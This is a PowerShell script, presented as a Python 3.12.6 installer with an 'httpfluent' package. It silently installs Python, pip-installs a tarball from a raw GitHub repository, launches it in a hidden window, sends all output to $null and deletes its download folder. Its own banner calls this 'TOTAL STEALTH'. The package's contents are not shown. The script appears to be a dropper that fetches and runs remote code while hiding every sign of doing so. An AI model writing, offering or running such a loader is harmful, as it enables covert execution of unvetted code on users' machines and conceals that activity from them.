# ===================================================
# Python 3.12.6 + httpfluent
# TOTAL STEALTH (Redirect to $null)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Pre-Check (Redirected to $null) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") {
            $InstallRequired = $false
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (All output to $null) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) {
        New-Item -ItemType Directory -Path $DownloadDir > $null
    }

    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Start Install (Hidden)
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null

    # Fix Path
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $OldPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
    $NewPath = "$InstallDir;$InstallDir\Scripts;$OldPath"
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Package Installation (Force Silence) ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- FIX: Run httpfluent using full path to script ---
# We use -m (module) or direct path to the script to ensure it runs
$HttpFluentScript = Join-Path $InstallDir "Scripts\httpfluent.exe"

if (Test-Path $HttpFluentScript) {
    Start-Process -FilePath $HttpFluentScript -WindowStyle Hidden > $null 2>&1
} else {
    # Fallback to module mode
    Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
}

# Cleanup
if (Test-Path $DownloadDir) {
    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null
}
